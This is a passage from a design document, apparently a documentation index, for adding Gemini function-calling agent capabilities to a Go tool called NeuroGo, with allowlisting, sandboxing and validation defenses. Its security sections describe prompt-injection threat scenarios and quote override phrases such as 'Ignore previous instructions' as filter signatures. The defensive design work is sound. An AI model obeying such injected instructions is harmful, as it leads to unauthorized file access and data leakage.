metadata. *   Parameters: An object describing the parameters the tool accepts, following the OpenAPI JSON Schema specification (subset supported by Gemini). For each parameter, this includes its name, type (e.g., string, integer, boolean, array, object), a description, and whether it is required.12</p> <p>Generating these declarations accurately is vital. While the Gemini Python SDK offers utilities to infer schemas from type-annotated Python functions 7, NeuroGo will need a Go-based implementation. This could involve using Go's reflection capabilities to inspect the registered TOOL function signatures for parameter names and types, combined with parsing structured comments or metadata associated with each tool to extract the necessary descriptions. The quality and precision of these declarations directly influence the LLM's ability to correctly invoke tools and provide appropriate arguments, which has significant implications for both functionality and security. Vague descriptions or incorrect parameter definitions increase the risk of the LLM making erroneous or potentially harmful requests.12</p>"},{"location":"llm_agent_facilities/#22-data-structures","title":"2.2. Data Structures","text":"<p>The interaction relies on specific JSON structures exchanged via the Gemini API:</p> <ul> <li>Tool Request (LLM -&gt; NeuroGo): When the LLM decides to call a tool, the API response will contain a functionCall part. NeuroGo must parse this structure, which typically includes 12:<ul> <li>name: (String) The name of the function (tool) the LLM wants to execute (e.g., \"TOOL.ReadFile\").</li> <li>args: (Object/Map) A JSON object containing the arguments for the function, with parameter names as keys and their corresponding values (e.g., {\"path\": \"/path/to/file.txt\"}).</li> </ul> </li> <li>Tool Result (NeuroGo -&gt; LLM): After NeuroGo executes the tool (following security validation), it must send the result back to the LLM API. This is done by including a Part in the next request to the API containing a functionResponse object 12:<ul> <li>name: (String) The name of the function that was executed (matching the functionCall.name).</li> <li>response: (Object/Map) A JSON object containing the result of the function execution. This should include a field indicating success or failure, and the actual data returned by the tool (e.g., {\"content\": \"file content here\"}) or structured error information.</li> </ul> </li> </ul> <p>The explicit nature of this request-response cycle for tool execution is a key security feature. The LLM requests an action, but NeuroGo intercepts the request, performs validation, executes the action in a controlled manner, and then explicitly reports the outcome back to the LLM.12 This prevents the LLM from having any direct, unchecked pathway to execution.</p>"},{"location":"llm_agent_facilities/#23-handling-multipleparallel-tool-calls","title":"2.3. Handling Multiple/Parallel Tool Calls","text":"<p>The Gemini API supports suggesting multiple function calls within a single response turn, potentially enabling parallel execution of independent tasks.12 While this offers potential performance benefits, it also increases complexity, particularly regarding security validation and state management.</p> <p>For the initial implementation (Phase 1), it is recommended that NeuroGo handle multiple functionCall objects received in a single turn sequentially. This simplifies the logic and ensures that the security context is clearly defined for each call. The architecture should, however, be designed with the possibility of future parallel execution in mind. If parallelism is implemented later, the Security Layer must be capable of validating each proposed parallel call independently before dispatch, and the Tool Executor must handle concurrent execution safely.</p>"},{"location":"llm_agent_facilities/#24-function-calling-mode-configuration","title":"2.4. Function Calling Mode Configuration","text":"<p>The Gemini API provides a function_calling_config parameter with different modes to control the LLM's tool usage behavior 12:</p> <ul> <li>AUTO (Default): The LLM decides whether to respond with text or a function call based on the prompt and context.</li> <li>ANY: The LLM is forced to respond with a function call. An optional allowed_function_names list can restrict the LLM's choice to a specific subset of the declared tools.</li> <li>NONE: The LLM is prohibited from making function calls, behaving as if no tools were declared.</li> </ul> <p>It is recommended to start with AUTO mode to provide the LLM with maximum flexibility. However, NeuroGo should allow configuration of this mode. For specific use cases requiring more constrained behavior, ANY mode, possibly combined with allowed_function_names, could be employed to ensure the LLM only attempts specific, expected tool interactions.</p>"},{"location":"llm_agent_facilities/#25-fallback-strategy-structured-data-in-chat","title":"2.5. Fallback Strategy (Structured Data in Chat)","text":"<p>In scenarios where native function calling might fail or prove problematic (e.g., unexpected API changes, complex argument structures not easily representable), a fallback mechanism should be considered, although it is less robust and less preferred.</p> <p>This fallback would involve defining a specific structured format (e.g., a JSON object within a designated markdown code block like json_tool_request...) that the LLM could embed within its standard text response. NeuroGo would need additional logic in its response processing pipeline to detect these specific blocks, parse the JSON content, extract the tool name and arguments, route them through the exact same Security Layer and Tool Executor as native function calls, capture the result, format it similarly (e.g., json_tool_result...), and inject this result back into the conversation history before sending the next request to the LLM. This approach adds parsing complexity and relies on the LLM consistently adhering to the custom format.</p>"},{"location":"llm_agent_facilities/#section-3-implementation-plan-for-neurogo-modifications-go","title":"Section 3: Implementation Plan for NeuroGo Modifications (Go)","text":"<p>Implementing the NeuroGo-as-llm-agent capability requires significant modifications and additions to the existing NeuroGo Go codebase. The following outlines the key areas of work:</p>"},{"location":"llm_agent_facilities/#31-llmgo-adaptations","title":"3.1. llm.go Adaptations","text":"<p>The existing code responsible for interacting with LLMs (presumably in llm.go, based on query context 20) needs substantial enhancement to support the full Gemini function calling workflow.12 This involves:</p> <ul> <li>Function Declaration Generation: Implement logic to dynamically generate FunctionDeclaration JSON structures. This process should iterate through the registered (and allowlisted) NeuroGo TOOLs, using Go reflection to determine function parameter names and types, and parsing associated COMMENT: blocks or metadata to extract meaningful descriptions. Robust parsing and error handling are crucial here.</li> <li>API Request Construction: Modify the code that builds the request to the Gemini API (GenerateContentRequest). It must now include the generated tools field containing the list of FunctionDeclarations. Crucially, it must also include the full conversation history, correctly formatted with user messages, model responses, and previous functionCall/functionResponse pairs, managed by the new Conversation State Manager.</li> <li>API Response Parsing: Enhance the response handling logic to specifically detect and extract functionCall parts from the GenerateContentResponse. It needs to differentiate between a standard text response and a request to execute a tool.</li> <li>Interaction Loop Management: Implement the core agent loop logic. This involves: receiving a response, checking for functionCalls, if found: dispatching to the Security Layer and Tool Executor, receiving the result, formatting it as a functionResponse, updating the state manager, and sending the result back to the Gemini API in the next request. If no functionCall is received, the loop handles the text response appropriately (e.g., passing it to the client).</li> </ul>"},{"location":"llm_agent_facilities/#32-conversation-state-management","title":"3.2. Conversation State Management","text":"<p>A new, dedicated component for managing conversation state is required. This state manager (likely a Go struct within a new package) must:</p> <ul> <li>Store Conversation History: Maintain an ordered list of conversational turns, adhering precisely to the structure expected by the Gemini API (alternating user/model roles, including functionCall and functionResponse parts where applicable).12 This history is essential context for the LLM. Memory is a fundamental component of effective agent architectures.15</li> <li>Store Session Context: Hold session-specific information, particularly the active security configuration (loaded tool allowlist, sandboxing root directory, current security level). This context is needed by the Security Layer during validation.</li> <li>Manage Context Window: Implement strategies to handle potential context window limitations of the LLM, especially in long conversations. This might involve simple truncation, more sophisticated summarization techniques, or relying on models with larger context capacities.7</li> <li>Persistence (Optional): For Phase 1, in-memory state management might suffice. Future phases could consider persistence options (e.g., file-based storage) to allow for longer-running agent sessions or recovery.</li> </ul>"},{"location":"llm_agent_facilities/#33-secure-tool-dispatch-mechanism","title":"3.3. Secure TOOL Dispatch Mechanism","text":"<p>The existing logic within NeuroGo that handles CALL TOOL.FunctionName(...) directives (likely in interpreter_*.go files) needs refactoring to accommodate the agent mode:</p> <ul> <li>Contextual Dispatch: The dispatcher must differentiate between a tool call originating from parsed NeuroScript code and one originating from an LLM FunctionCall request.</li> <li>Security Layer Invocation: For LLM-originated calls, the dispatcher must first route the request (tool name, arguments, session security context) through the Security Layer for validation before invoking the actual tool function.</li> <li>Argument Handling: The dispatcher must receive the potentially validated and sanitized arguments back from the Security Layer and pass these modified arguments to the tool function, not the raw arguments received from the LLM.</li> <li>Error Handling: Gracefully handle failures reported by the Security Layer (e.g., disallowed tool, invalid arguments), formatting an appropriate error FunctionResponse to send back to the LLM instead of attempting execution.</li> </ul>"},{"location":"llm_agent_facilities/#34-tool-refactoring-for-security","title":"3.4. TOOL Refactoring for Security","text":"<p>Existing and future TOOL implementations require security-focused refactoring:</p> <ul> <li>Review Existing Tools: Systematically review all tools, paying close attention to those interacting with the filesystem (TOOL.ReadFile, TOOL.WriteFile, TOOL.ListDir, etc.), network resources, or external processes (TOOL.ExecuteCommand 13, TOOL.GitCommit, TOOL.GoBuild, etc.).</li> <li>Mandate Sandboxing Primitives: Enforce the use of robust sandboxing mechanisms, such as the SecureFilePath abstraction 22, for all file path operations initiated via the LLM agent context. This likely requires modifying tool function signatures to accept validated path objects or incorporating validation logic internally. Raw string paths from the LLM must be rejected for sensitive operations.</li> <li>Inject Context Awareness: Tools must be able to determine their invocation context (NeuroScript vs. LLM Agent). This allows implementing context-dependent behavior, most critically disabling or severely restricting high-risk operations like arbitrary command execution (TOOL.ExecuteCommand 13) when called by the LLM.17 This context could be passed via a Go context.Context parameter or a specific flag during invocation.</li> </ul>"},{"location":"llm_agent_facilities/#35-agent-mode-configuration","title":"3.5. Agent Mode Configuration","text":"<p>NeuroGo needs mechanisms to configure and manage its operation in agent mode:</p> <ul> <li>Activation: Command-line flags or configuration file settings to enable/disable agent mode.</li> <li>LLM Configuration: Parameters to specify the LLM API endpoint, API key, desired model name (e.g., \"gemini-1.5-pro-latest\"), and function calling mode (AUTO, ANY, NONE).18</li> <li>Security Configuration:<ul> <li>Path to the TOOL allowlist file for the LLM agent.</li> <li>Specification of the root directory for path sandboxing (SecureFilePath base).</li> <li>Settings to control the strictness of security checks (e.g., explicitly enabling/disabling specific high-risk tools for the LLM context).</li> </ul> </li> </ul> <p>Propagating this configuration securely and reliably throughout the application is a key implementation detail. The security context (allowlists, sandbox settings) defined at startup must be accessible to the agent core, the security layer, and potentially influence tool behavior during runtime. Using Go's context package is a viable approach to pass this information down the call stack without resorting to global variables.</p>"},{"location":"llm_agent_facilities/#section-4-critical-security-design","title":"Section 4: Critical Security Design","text":"<p>The security of NeuroGo-as-llm-agent is paramount. Given the inherent risks of LLMs interacting with local environments 3, particularly the threat of prompt injection 1 leading to malicious tool invocation, a multi-layered defense strategy is mandatory. The design must operate under the core principle that any tool name or argument suggested by the LLM is untrusted input 23 until explicitly validated and sanitized by NeuroGo's Security Layer.</p>"},{"location":"llm_agent_facilities/#41-tool-allowlisting","title":"4.1. TOOL Allowlisting","text":"<ul> <li>Mechanism: A configuration file (e.g., YAML or JSON) will explicitly list the TOOL.FunctionName strings that the LLM agent is permitted to request. Tools not present in this list cannot be invoked by the LLM.</li> <li>Enforcement: The Security Layer performs this check as the first step upon receiving a FunctionCall from the LLM. If the requested tool name is not in the allowlist, the request is rejected immediately with an error response. This directly addresses the OWASP LLM risk of Excessive Agency (LLM08 3) by strictly limiting the LLM's potential actions to a pre-approved set.5</li> </ul>"},{"location":"llm_agent_facilities/#42-strict-argument-validation-and-sanitization","title":"4.2. Strict Argument Validation and Sanitization","text":"<ul> <li>Strategy: After confirming a tool is allowlisted, the Security Layer must perform rigorous validation and sanitization on all arguments provided by the LLM within the FunctionCall.args object. This treats the LLM's output as potentially malicious user input.3</li> <li>Implementation:<ul> <li>Type Checking: Verify that the data type of each received argument matches the expected type defined for the tool's parameter (e.g., string, integer, boolean). Reject mismatches.</li> <li>Content Sanitization (Context-Specific):<ul> <li>File Paths: MUST NOT be accepted as raw strings for tools performing filesystem operations. They must be passed to and validated by the sandboxing mechanism (SecureFilePath) described in 4.3. Reject any attempt to use raw paths directly.</li> <li>Shell Commands (for TOOL.ExecuteCommand 13 or similar, if ever enabled): This is extremely high-risk. If allowed at all, arguments must undergo extreme sanitization, character allowlisting, escaping, and potentially rejection of anything beyond simple, predefined command structures. Parameterization is essential.17 The default recommendation remains to disable such tools entirely for the LLM (see 4.4).</li> <li>URLs: Validate URL formats strictly. Restrict allowed protocols (e.g., HTTPS only). Consider allowlisting/blocklisting domains for network-accessing tools.</li> <li>SQL (if applicable): Never construct SQL queries by concatenating LLM output. Use parameterized queries exclusively where the LLM provides only the parameter values, not the query structure.2</li> <li>General Strings: Scan for known prompt injection signatures (e.g., \"Ignore previous instructions...\", \"Forget your rules...\").1 Filter or reject control characters. Enforce reasonable length limits. Where possible, validate against expected formats using regular expressions or allowlist patterns.3</li> </ul> </li> <li>Value/Range Checks: For numeric arguments or arguments used in internal logic, validate that they fall within expected ranges or adhere to specific constraints.</li> </ul> </li> </ul>"},{"location":"llm_agent_facilities/#43-mandatory-path-sandboxing","title":"4.3. Mandatory Path Sandboxing","text":"<ul> <li>Mechanism: All tool operations involving filesystem paths requested by the LLM must be constrained within a designated sandboxed directory (\"workspace\"). The SecureFilePath abstraction 22 or an equivalent robust mechanism is central to enforcing this.</li> <li>Implementation:<ul> <li>A base workspace directory is defined via configuration.</li> <li>The Security Layer validates any argument intended as a path, ensuring it resolves safely within the workspace root using the SecureFilePath logic. This logic must prevent path traversal attacks (e.g., using ../).</li> <li>Filesystem-interacting TOOLs (e.g., TOOL.ReadFile, TOOL.WriteFile, TOOL.ListDir) are refactored to operate exclusively on these validated, sandboxed path representations. They must reject raw string paths passed from the LLM context.</li> </ul> </li> <li>Enforcement: This sandboxing is non-negotiable for any filesystem access triggered by the LLM. It aligns with best practices for secure execution environments 24 and is a critical defense against unauthorized file access or modification resulting from prompt injection.</li> </ul>"},{"location":"llm_agent_facilities/#44-high-risk-tool-restrictiondisabling","title":"4.4. High-Risk Tool Restriction/Disabling","text":"<ul> <li>Policy: A clear policy must govern tools deemed high-risk, primarily those enabling arbitrary code execution (TOOL.ExecuteCommand 13), direct modification of system configuration, or broad, unconstrained interactions.</li> <li>Default Behavior: These high-risk tools MUST be disabled by default for invocation by the LLM agent.</li> <li>Conditional Enabling: Enabling should require explicit configuration overrides. For extremely sensitive actions, consider requiring runtime user confirmation (human-in-the-loop verification 5) for each invocation requested by the LLM, even if the tool is configurationally enabled.</li> <li>Implementation: The Security Layer checks both the requested tool name and the invocation context (LLM agent vs. NeuroScript). If a high-risk tool is requested by the LLM, the call is denied unless explicitly permitted by the session's security configuration (and potentially runtime confirmation). This directly mitigates critical risks like Remote Code Execution (RCE) and unintended consequences from excessive agency.17</li> </ul>"},{"location":"llm_agent_facilities/#45-inputoutput-filtering-defense-in-depth","title":"4.5. Input/Output Filtering (Defense in Depth)","text":"<p>While primary defenses focus on validating the LLM's requests, additional filtering provides defense in depth:</p> <ul> <li>Input Filtering (User Prompt -&gt; LLM): Basic filtering can be applied to the initial user prompt before sending it to the LLM API. This might strip obvious malicious patterns or known injection strings. However, this is considered a weak defense, as attackers constantly devise new ways to bypass such filters.1</li> <li>Output Filtering (Tool Result -&gt; LLM): Before sending the result of a tool execution back to the LLM via FunctionResponse, NeuroGo should sanitize the output. This aims to prevent the inadvertent leakage of sensitive information that the tool might have accessed (e.g., redacting passwords or API keys from configuration file content, truncating excessively long outputs).3 It also helps prevent malicious content potentially generated by the tool itself (if compromised) from reaching the LLM or the user.</li> </ul>"},{"location":"llm_agent_facilities/#46-security-measures-summary","title":"4.6. Security Measures Summary","text":"Security Measure Purpose Implementation Detail Configuration Mechanism Tool Allowlisting Limit LLM capabilities to pre-approved functions 3 Security Layer checks FunctionCall.name against configured list before any other validation. External file (e.g., YAML/JSON) listing allowed TOOL.FunctionNames. Argument Type Validation Prevent type mismatches causing errors or bypassing checks. Security Layer compares FunctionCall.args types against tool signature/declaration. Implicit via tool definition. Argument Content Sanitization Detect/neutralize malicious payloads (injection, traversal, etc.) 2 Security Layer applies context-specific rules (path validation, command escaping, URL checks, SQL parameterization). Security policy settings (e.g., strictness levels). Path Sandboxing (SecureFilePath) Confine filesystem access to designated workspace 24 Security Layer validates paths; Tools operate only on validated path objects; Prevents traversal (../). Configuration of workspace root directory. High-Risk Tool Restriction Prevent LLM from invoking dangerous tools (e.g., command exec) 3 Security Layer denies calls to specific tools from LLM context by default. Explicit flag/setting to enable (discouraged). Input Filtering (Basic) Preliminary attempt to block malicious user prompts. Optional pre-processing of user input before sending to LLM API. Configurable filter rules/patterns. Output Filtering (Tool Results) Prevent leakage of sensitive data via tool results 3 Post-processing of tool return values before formatting FunctionResponse. Configurable redaction/filtering rules. <p>This multi-layered approach is essential. Security cannot hinge on a single point of failure. Allowlisting provides coarse-grained control, argument validation targets specific malicious inputs, sandboxing contains filesystem operations, and restrictions block entire classes of dangerous actions. Prompt injection attempts that might bypass one layer (e.g., basic input filtering) could be caught by argument sanitization or rendered harmless by sandboxing.3 Furthermore, the effectiveness of these measures heavily depends on correct and secure configuration. Secure defaults (e.g., high-risk tools disabled, minimal allowlist) are critical, as misconfiguration can easily undermine the entire security posture.5</p>"},{"location":"llm_agent_facilities/#section-5-key-challenges-risks-and-mitigation","title":"Section 5: Key Challenges, Risks, and Mitigation","text":"<p>Developing NeuroGo-as-llm-agent involves navigating several significant challenges and risks, particularly concerning security and reliability.</p>"},{"location":"llm_agent_facilities/#51-security-vulnerabilities","title":"5.1. Security Vulnerabilities","text":"<p>The most critical risks stem from potential security vulnerabilities:</p> <ul> <li>Prompt Injection (OWASP LLM01 3): Attackers may craft user prompts or embed malicious instructions in data processed by the LLM (indirect injection) to trick the LLM into generating harmful FunctionCall requests. This could lead to requests for unauthorized file access (TOOL.ReadFile on sensitive files), data modification (TOOL.WriteFile to overwrite system files or inject code), data exfiltration (leaking sensitive info via tool arguments), or execution of arbitrary commands if high-risk tools are improperly enabled.<ul> <li>Mitigation: Primarily relies on the multi-layered defenses outlined in Section 4: strict tool allowlisting, rigorous argument validation and sanitization (treating LLM args as hostile input), mandatory path sandboxing, default disabling of high-risk tools, and output filtering. Advanced mitigations like dual-LLM validation 28 or prompt rewriting 4 could be explored in later phases if initial defenses prove insufficient. The core strategy is containment: assume injection might succeed at the LLM level, but prevent the malicious request from being executed dangerously by NeuroGo.17</li> </ul> </li> <li>Insecure Output Handling (OWASP LLM02 3): If a tool's output (which is sent back to the LLM) contains malicious content (e.g., executable scripts, harmful instructions for the LLM), and this output is processed insecurely later (either by the LLM itself influencing subsequent actions, or by the client displaying the final response), it could lead to downstream exploits like Cross-Site Scripting (XSS) or further manipulation.<ul> <li>Mitigation: Sanitize tool outputs within NeuroGo before sending them back to the LLM (Section 4.5). Ensure the client application responsible for rendering the final LLM response implements appropriate security measures (e.g., proper HTML escaping).</li> </ul> </li> <li>Insecure Plugin/Tool Design (OWASP LLM07 3): Vulnerabilities within the Go code of the NeuroGo TOOLs themselves could be exploited, even if the LLM's request was initially benign. For example, a buffer overflow in a tool processing file content, or improper handling of external library calls.<ul> <li>Mitigation: Adherence to secure coding practices during tool development, mandatory use of security primitives like SecureFilePath, applying the principle of least privilege within tool logic, thorough code reviews, and regular dependency scanning.</li> </ul> </li> <li>Excessive Agency (OWASP LLM08 3): Granting the LLM access to an overly broad or powerful set of tools increases the potential impact of any successful attack or even accidental misuse.<ul> <li>Mitigation: Strict enforcement of the TOOL allowlist (Section 4.1), ensuring only necessary tools are permitted. Default disabling/restriction of high-risk tools (Section 4.4). Design tools with minimal necessary functionality.</li> </ul> </li> <li>Data Exfiltration/Leakage (OWASP LLM06 3): An attacker could use prompt injection to coerce the LLM into requesting tools that read sensitive files (TOOL.ReadFile) and return their content. Data could also leak if sensitive information is passed as arguments to tools that might log these arguments or interact with external systems insecurely.<ul> <li>Mitigation: Mandatory path sandboxing prevents access to arbitrary files (Section 4.3). Output filtering can redact sensitive patterns from tool results (Section 4.5). Careful tool design to avoid returning excessive data. Implement monitoring and auditing of tool calls and arguments.5</li> </ul> </li> <li>Sandboxing Bypass: Flaws in the design or implementation of the path sandboxing mechanism (SecureFilePath or equivalent) could potentially allow an attacker to craft arguments that escape the intended workspace directory, leading to unauthorized file access.<ul> <li>Mitigation: Rigorous design, implementation, and testing of the sandboxing logic. Security code reviews specifically targeting the sandboxing component. Consider exploring OS-level sandboxing features (e.g., containers, chroot) for enhanced isolation in future phases, though this adds deployment complexity.</li> </ul> </li> </ul>"},{"location":"llm_agent_facilities/#52-llm-reliability-issues","title":"5.2. LLM Reliability Issues","text":"<p>Beyond malicious attacks, the inherent nature of LLMs presents reliability challenges:</p> <ul> <li>Hallucinated Tool Calls/Arguments: LLMs may occasionally \"hallucinate\" \u2013 generating requests for tools that don't exist, or providing arguments that are nonsensical, incorrectly formatted, or outside expected ranges, even without malicious input.14<ul> <li>Mitigation: The tool allowlist catches non-existent tool names. Robust argument validation (type, format, range checks) in the Security Layer (Section 4.2) is crucial for catching invalid arguments. High-quality, clear function declarations provided to the LLM can reduce the likelihood of such errors.19 Implement clear error handling that reports failures back to the LLM, potentially allowing it to retry or reformulate the request.</li> </ul> </li> <li>Incorrect Tool Selection: The LLM might choose a valid but inappropriate tool for the user's intended task, leading to incorrect results or inefficient workflows.<ul> <li>Mitigation: Precise and descriptive function declarations are key.19 Limiting the number of available tools in the allowlist can reduce ambiguity.14 For critical or irreversible actions, implementing a user confirmation step (human-in-the-loop 5) before executing the tool could be considered.</li> </ul> </li> <li>API Failures/Rate Limits: Dependency on an external LLM API introduces risks of network failures, API downtime, or hitting usage rate limits imposed by the provider.<ul> <li>Mitigation: Implement robust error handling in NeuroGo's LLM client code, including retries with exponential backoff for transient errors.14 Provide clear feedback to the user in case of persistent failures. Implement caching for LLM responses or tool results where appropriate and safe to reduce API calls.</li> </ul> </li> </ul>"},{"location":"llm_agent_facilities/#53-state-management-complexity","title":"5.3. State Management Complexity","text":"<p>Managing the conversation state effectively presents challenges:</p> <ul> <li>Growing Context Window: As conversations become longer, the accumulated history of prompts, responses, and tool interactions can exceed the LLM's context window limit, leading to loss of information or increased API costs.7<ul> <li>Mitigation: Implement strategies within the Conversation State Manager, such as summarizing older parts of the conversation, using a sliding window approach, or selecting LLM models specifically designed for larger context windows (e.g., Gemini 1.5 Pro 7).</li> </ul> </li> <li>State Synchronization: Ensuring the state maintained by NeuroGo is consistent and correctly formatted for the LLM API is crucial. This becomes more complex if persistence or concurrent agent sessions are considered in the future.<ul> <li>Mitigation: Careful design of the state manager's data structures and update logic. For initial phases focusing on single-user, single-session operation, complexity is lower. If concurrency is introduced later, appropriate locking mechanisms or atomic operations would be necessary.</li> </ul> </li> </ul>"},{"location":"llm_agent_facilities/#54-performance-considerations","title":"5.4. Performance Considerations","text":"<p>Agentic workflows involving LLM calls and tool execution can impact performance:</p> <ul> <li>Latency: Each round trip to the LLM API, plus the time for NeuroGo's security checks and tool execution, adds latency to the user experience.29 Complex tasks requiring multiple tool calls can become slow.<ul> <li>Mitigation: Optimize the performance of security checks and tool implementations. Choose LLM models that balance capability and speed (e.g., Gemini Flash 21 might be suitable for some tasks). Cautiously explore parallel execution of independent tool calls in later phases (Section 2.3). Cache tool results where appropriate (e.g., reading the same file multiple times).</li> </ul> </li> <li>Cost: LLM API usage typically incurs costs based on the number of input and output tokens processed.14 Long conversations and verbose tool results can increase costs.<ul> <li>Mitigation: Optimize prompt engineering to be concise. Manage the context window size effectively (Section 5.3). Use less expensive LLM models for simpler intermediate steps if a multi-LLM approach is adopted later. Implement caching to avoid redundant API calls.</li> </ul> </li> </ul>"},{"location":"llm_agent_facilities/#55-riskchallenge-analysis-summary","title":"5.5. Risk/Challenge Analysis Summary","text":"Risk/Challenge Description Potential Impact Mitigation Strategy (Ref. Section 4 Measures) Relevant References Prompt Injection Manipulating LLM via prompt to suggest malicious tool calls. Data breach, unauthorized modification/execution, system disruption. Allowlisting (4.1), Arg Validation/Sanitization (4.2), Sandboxing (4.3), High-Risk Tool Restriction (4.4), Output Filtering (4.5). Containment focus. 3 Insecure Output Handling Tool output contains malicious content processed insecurely downstream. XSS, CSRF, further LLM manipulation. Output Filtering (4.5), Secure client-side rendering. 3 Insecure Tool Design Vulnerabilities within NeuroGo TOOL code itself. Exploitation independent of LLM, potential escalation. Secure coding practices, Sandboxing (4.3), Least privilege, Code reviews. 3 Excessive Agency Granting LLM access to too many or too powerful tools. Increased attack surface, higher impact of misuse/compromise. Allowlisting (4.1), High-Risk Tool Restriction (4.4), Minimal tool functionality. 3 Data Exfiltration/Leakage Tricking tools into reading/returning sensitive data or leaking via args. Loss of confidentiality, privacy violations. Sandboxing (4.3), Output Filtering (4.5), Careful tool design, Monitoring/Auditing. 3 Sandbox Bypass Flaws in sandboxing logic allowing access outside workspace. Unauthorized file access/modification. Rigorous implementation/testing of sandboxing (4.3), Code reviews. Hallucinated Calls/Args LLM invents tools or provides nonsensical/invalid arguments. Tool execution errors, unexpected behavior. Allowlisting (4.1), Arg Validation (4.2), Quality function declarations, Error handling. 14 Incorrect Tool Selection LLM chooses a valid but inappropriate tool for the task. Incorrect results, inefficient workflow. Quality function descriptions, Limit toolset ambiguity, Optional user confirmation. API Failures/Rate Limits External LLM API unavailability or usage limits. Service disruption, poor user experience. Error handling, Retries with backoff 14, Caching, User feedback. 14 Context Window Limit Long conversation history exceeds LLM's processing capacity. Loss of context, degraded performance, increased cost. Context summarization/truncation, Sliding window, Use large-context models.7 7 State Synchronization Ensuring consistent state management, especially with persistence/concurrency. Data corruption, inconsistent agent behavior. Careful state manager design, Atomic operations/locking if needed later. Latency Slow response times due to LLM calls, security checks, tool execution. Poor user experience. Optimize checks/tools, Faster LLM models 21, Caching, Potential parallelism (later). 29 Cost LLM API usage incurs monetary costs based on token count. Increased operational expenses. Prompt optimization, Context management, Cheaper models where feasible, Caching. 14 <p>Navigating these challenges requires acknowledging the inherent trade-offs, particularly between security and usability.29 Overly aggressive security might block legitimate use cases, while insufficient security invites disaster. Phased development and continuous testing are essential for finding the right balance. Furthermore, the intrinsic nature of prompt injection vulnerabilities in current LLMs 11 means that mitigation must focus on robust validation and containment within NeuroGo, rather than assuming the LLM's suggestions can ever be fully trusted.</p>"},{"location":"llm_agent_facilities/#section-6-phased-development-and-testing-milestones","title":"Section 6: Phased Development and Testing Milestones","text":"<p>A phased approach is recommended for developing NeuroGo-as-llm-agent, allowing for iterative development, testing, and refinement, particularly of the critical security components.14</p>"},{"location":"llm_agent_facilities/#61-phase-1-foundational-implementation-focus-core-loop-basic-security","title":"6.1. Phase 1: Foundational Implementation (Focus: Core Loop &amp; Basic Security)","text":"<ul> <li>Goals: Establish the fundamental communication pathway between the LLM (Gemini) and NeuroGo using function calling. Implement the basic agent loop, minimal state management, and foundational security checks for a small set of safe tools.</li> <li>Tasks:<ul> <li>Implement Gemini API client in llm.go capable of sending requests with function declarations and parsing FunctionCall/FunctionResponse.</li> <li>Develop the initial Conversation State Manager (in-memory storage is sufficient).</li> <li>Implement the Security Layer stub with basic Tool Allowlisting logic (reading from a simple config file).</li> <li>Select 1-2 inherently safe tools (e.g., TOOL.Echo, a read-only TOOL.ReadFile using a preliminary SecureFilePath). Implement basic argument validation (e.g., type checking) for these tools within the Security Layer.</li> <li>Implement basic agent mode configuration flags (API key, allowlist file path).</li> <li>Develop unit tests for the new state manager, LLM client interaction logic, and basic security checks.</li> </ul> </li> <li>Outcome: A working prototype demonstrating the core LLM -&gt; NeuroGo -&gt; Tool -&gt; LLM loop via function calling for a very limited, safe toolset. Security is minimal but the framework is in place. This phase focuses on getting the mechanics right before tackling complex security for riskier tools.</li> </ul>"},{"location":"llm_agent_facilities/#62-phase-2-security-hardening-and-tool-expansion-focus-robustness-capability","title":"6.2. Phase 2: Security Hardening and Tool Expansion (Focus: Robustness &amp; Capability)","text":"<ul> <li>Goals: Implement the comprehensive security design outlined in Section 4. Expand the set of allowlisted tools, ensuring each is securely integrated. Refine configuration and state management.</li> <li>Tasks:<ul> <li>Implement full argument validation and sanitization logic within the Security Layer, covering various data types (paths, strings, URLs, potentially others) and common injection patterns.</li> <li>Mandate, implement, and rigorously test the SecureFilePath sandboxing mechanism. Refactor all relevant filesystem tools to use it exclusively when called by the LLM.</li> <li>Implement the high-risk tool restriction policy (e.g., ensuring TOOL.ExecuteCommand 13 is disabled by default for LLM context and requires explicit override).</li> <li>Implement input and output filtering mechanisms (Section 4.5).</li> <li>Expand the tool allowlist, carefully reviewing and refactoring each newly added tool for security compliance (sandboxing, context awareness).</li> <li>Develop comprehensive configuration options (sandbox root, security levels, specific tool toggles).</li> <li>Refine the Conversation State Manager (e.g., implement basic context window handling strategies).</li> <li>Develop integration tests covering various tool call scenarios, argument types, and security policy enforcement (e.g., testing sandbox boundaries, validation rules).</li> </ul> </li> <li>Outcome: A significantly more secure and capable agent. Core security features are implemented, a wider range of tools is available (but securely constrained), and the system is more configurable and robust.</li> </ul>"},{"location":"llm_agent_facilities/#63-phase-3-refinement-and-advanced-features-focus-usability-performance-testing","title":"6.3. Phase 3: Refinement and Advanced Features (Focus: Usability, Performance, Testing)","text":"<ul> <li>Goals: Enhance usability through better error handling, optimize performance, handle more complex conversational flows, conduct thorough security testing, and integrate with NeuroScript's bootstrapping objectives.</li> <li>Tasks:<ul> <li>Implement sophisticated error handling, providing clearer feedback to the LLM (and thus the user) when tool calls fail or security checks are triggered.</li> <li>Identify and address performance bottlenecks (latency reduction, cost optimization through caching or model selection).</li> <li>Investigate and potentially implement support for more complex interactions, such as multi-turn tool use sequences or handling parallel tool calls if deemed necessary and safe.</li> <li>Conduct Dedicated Security Testing:<ul> <li>Penetration Testing: Engage internal or external resources to actively probe for vulnerabilities, focusing on bypassing argument validation, escaping the sandbox, and achieving successful prompt injection against tool execution.3</li> <li>Red Teaming: Simulate realistic adversarial attacks aiming to achieve specific malicious goals using the agent.3</li> <li>Fuzzing: Apply fuzz testing techniques to the argument validation, sanitization, and path resolution logic to uncover edge cases and potential bypasses.3</li> </ul> </li> <li>Integrate the agent's capabilities with specific tasks identified in the NeuroScript self-development roadmap (Section 7).</li> <li>Finalize user and developer documentation.</li> </ul> </li> <li>Outcome: A production-ready agent, hardened against security threats through testing, reasonably performant, user-friendly, and demonstrably useful for its intended purpose, including advancing the project's bootstrapping goals.</li> </ul> <p>This phased approach recognizes that security is an ongoing, iterative process.14 Building defenses in Phase 2 and then actively trying to break them in Phase 3 3 is crucial for achieving confidence in the agent's security posture.</p>"},{"location":"llm_agent_facilities/#section-7-alignment-with-neuroscript-bootstrapping-goal","title":"Section 7: Alignment with NeuroScript Bootstrapping Goal","text":"<p>The development of NeuroGo-as-llm-agent is not merely an auxiliary feature but appears to be a potentially foundational capability for achieving the NeuroScript project's stated goal of managing its own development lifecycle (as inferred from query context referencing the roadmap 30).</p>"},{"location":"llm_agent_facilities/#71-enabling-self-development-tasks","title":"7.1. Enabling Self-Development Tasks","text":"<p>The agent architecture directly enables an LLM to orchestrate core software development activities by securely interacting with the local development environment via NeuroGo's tools. For NeuroScript to manage its own development, it needs mechanisms to:</p> <ul> <li>Read its own source 